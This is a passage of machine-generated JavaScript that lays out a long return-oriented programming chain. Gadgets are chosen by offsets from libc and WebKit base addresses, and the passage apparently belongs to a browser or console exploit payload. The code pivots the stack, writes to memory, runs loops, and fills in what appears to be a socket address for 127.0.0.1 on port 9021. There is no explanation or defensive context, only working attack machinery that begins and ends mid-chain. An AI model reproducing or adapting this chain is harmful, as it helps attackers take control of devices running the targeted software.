libc_base+793877, //pop rsi
ropchain+182480, //L2872
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L2872:
db([0, 0]); // 0x0
set_gadgets([
ropchain+182504, //L2872+24
ropchain+182808, //L2867
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+182576, //L2875
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2873:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2874:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2875:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+182672, //L2876
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+182688, //L2877
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2876:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2877:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+182800, //L2878
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+182784, //L2879
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2879:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2878:
db([0, 0]); // 0x0
//L2867:
set_gadget(libc_base+788575,); //pop rax
//L2880:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2882:
ropchain+203760, //L2881
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2884:
ropchain+182968, //L2883
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+194392, //L2652
//L2883:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
//L2885:
libc_base+788575 //pop rax
]);
//L2886:
db([6, 0]); // 0x6
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2887:
db([1, 0]); // 0x1
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2888:
db([2, 0]); // 0x2
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2890:
ropchain+183208, //L2889
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+199752, //L2891
//L2889:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+183344, //L2893
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+183360, //L2894
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+183328, //L2892
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2892:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2893:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2894:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+183456, //L2896
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+183440, //L2895
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2895:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2896:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+183536, //L2897
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2897:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2898:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2899:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+183688, //L2901
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+183704, //L2902
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+183672, //L2900
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2900:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2901:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2902:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
webkit_base+8824269, //setle al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+183872, //L2904
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+183888, //L2905
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+183856, //L2903
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2903:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2904:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2905:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+183976, //L2906
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+184008, //L2909
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2906:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2908:
db([4294967256, 4294967295]); // -0x28
set_gadget(libc_base+206806,); //pop rdi
//L2909:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+184176, //L2913
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+184144, //L2910
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+184128, //L2911
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2911:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2910:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2912:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2913:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+184280, //L2915
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+184328, //L2918
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+184296, //L2916
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2915:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2916:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2917:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2918:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+184440, //L2919+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+184432, //L2919
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L2919:
db([0, 0]); // 0x0
set_gadgets([
ropchain+184456, //L2919+24
ropchain+184664, //L2914
libc_base+788575 //pop rax
]);
//L2920:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2922:
ropchain+203784, //L2921
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2924:
ropchain+184616, //L2923
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+194392, //L2652
//L2923:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+811575, //pop rsp
ropchain+184680, //L2925
//L2914:
libc_base+811575, //pop rsp
ropchain+184696, //L2926
//L2925:
libc_base+811575, //pop rsp
ropchain+183000, //L2885
//L2926:
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
//L2928:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+184776, //L2930
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2929:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2930:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
//L2932:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+184872, //L2934
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2933:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2934:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+184944, //L2936
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2935:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2936:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+185016, //L2938
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2937:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2938:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+185088, //L2940
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2939:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2940:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+185160, //L2942
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2941:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2942:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+185232, //L2944
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2943:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2944:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+185304, //L2946
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2945:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2946:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+185376, //L2948
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2947:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2948:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2950:
db([4294967241, 4294967295]); // -0x37
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+185472, //L2952
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2951:
db([2, 0]); // 0x2
set_gadget(libc_base+788575,); //pop rax
//L2952:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2954:
db([4294967242, 4294967295]); // -0x36
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+185560, //L2955
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2955:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2957:
db([15651, 0]); // 0x3d23
set_gadgets([
libc_base+562536, //mov [rdi], cx
libc_base+793877, //pop rsi
ropchain+185648, //L2960
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2959:
db([4294967244, 4294967295]); // -0x34
set_gadget(libc_base+206806,); //pop rdi
//L2960:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+185712, //L2962
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2961:
db([16777343, 0]); // 0x100007f
set_gadget(libc_base+788575,); //pop rax
//L2962:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+185776, //L2964
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2963:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L2964:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+185872, //L2966
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2965:
db([4294967240, 4294967295]); // -0x38
set_gadget(libc_base+788575,); //pop rax
//L2966:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+185976, //L2969
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2968:
db([4294967256, 4294967295]); // -0x28
set_gadget(libc_base+792472,); //pop rcx
//L2969:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+186064, //L2970
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+186080, //L2972
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2970:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2972:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+186232, //L2974
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+186264, //L2976
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+186216, //L2973
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+186248, //L2975
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2973:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2974:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2975:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2976:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+186360, //L2978
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+186344, //L2977
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2977:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2978:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2980:
ropchain+186464, //L2979
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+198424, //L2981
//L2979:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
//L2982:
libc_base+793877, //pop rsi
ropchain+186552, //L2985
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2984:
db([4294967260, 4294967295]); // -0x24
set_gadget(libc_base+792472,); //pop rcx
//L2985:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+186640, //L2986
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+186656, //L2988
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2986:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2988:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+186808, //L2990
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+186840, //L2992
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+186792, //L2989
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+186824, //L2991
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2989:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2990:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2991:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2992:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+186912, //L2993
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+186928, //L2994
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2993:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2994:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+187032, //L2996
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+187080, //L2999
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+187048, //L2997
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2996:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2997:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2998:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2999:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+187192, //L3000+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+187184, //L3000
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L3000:
db([0, 0]); // 0x0
set_gadgets([
ropchain+187208, //L3000+24
ropchain+192592, //L2995
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+187264, //L3002
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L3001:
db([64, 0]); // 0x40
set_gadget(libc_base+792472,); //pop rcx
//L3002:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+187360, //L3005
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3004:
db([4294967260, 4294967295]); // -0x24
set_gadget(libc_base+792472,); //pop rcx
//L3005:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+187448, //L3006
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+187464, //L3008
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3006:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3008:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+187616, //L3010
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+187648, //L3012
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+187600, //L3009
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+187632, //L3011
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3009:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3010:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3011:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3012:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+187720, //L3013
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+187736, //L3014
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3013:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3014:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+187832, //L3016
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+187816, //L3015
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3015:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3016:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+187928, //L3019
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3018:
db([4294967264, 4294967295]); // -0x20
set_gadget(libc_base+792472,); //pop rcx
//L3019:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+188016, //L3020
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+188032, //L3022
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3020:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3022:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+188176, //L3025
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+188144, //L3023
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+188160, //L3024
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3023:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3024:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3025:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+188272, //L3028
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3027:
db([4294967256, 4294967295]); // -0x28
set_gadget(libc_base+792472,); //pop rcx
//L3028:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+188360, //L3029
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+188376, //L3031
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3029:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3031:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+188528, //L3033
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+188560, //L3035
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+188512, //L3032
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+188544, //L3034
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3032:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3033:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3034:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3035:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+188656, //L3037
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
